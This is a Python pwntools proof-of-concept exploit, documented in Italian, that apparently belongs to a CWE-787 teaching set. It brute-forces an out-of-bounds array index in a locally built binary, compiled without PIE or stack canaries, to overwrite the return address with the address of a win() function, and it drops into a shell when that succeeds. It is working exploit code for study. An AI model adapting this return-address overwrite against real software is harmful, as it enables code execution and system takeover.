"""
@file CWE-787 Array OOB Write Stack Exploit.py
@brief Exploit PoC per CWE-787
Target: CWE-787 Array OOB Write

Descrizione:
Questo script calcola l'offset corretto (tramite brute-force o calcolo statico)
per sovrascrivere l'indirizzo di ritorno (Return Address) sullo stack con 
l'indirizzo della funzione `win()`.

Prerequisiti:
- Binary compilato senza PIE/Canary: gcc -no-pie -fno-stack-protector ...
- Pwntools installato: pip install pwntools
"""

from pwn import *
import os

binary_path = os.path.abspath('../build/CWE-787 Array OOB Write')
elf = ELF(binary_path, checksec=False)
context.binary = elf

log.info("Starting exploit for vuln1 (Array OOB Write)...")

win_addr = elf.symbols['win']
log.info(f"Target 'win' address: {hex(win_addr)}")

offset_index = 4 

for idx in range(3, 8):
    log.info(f"Trying index {idx}...")
    p = process([binary_path, str(idx), str(win_addr)])
    try:
        
        output = p.recvuntil(b"Done\n", timeout=0.1)
        
        # If successfully overwritten, it should print "Spawning shell..."
        more_output = p.recv(timeout=0.2)
        if b"Spawning shell" in more_output:
            log.success(f"SUCCESS! Shell spawned at index {idx}")
            log.info("Switching to interactive mode...")
            p.interactive()
            break
        p.close()
    except Exception as e:
        p.close()


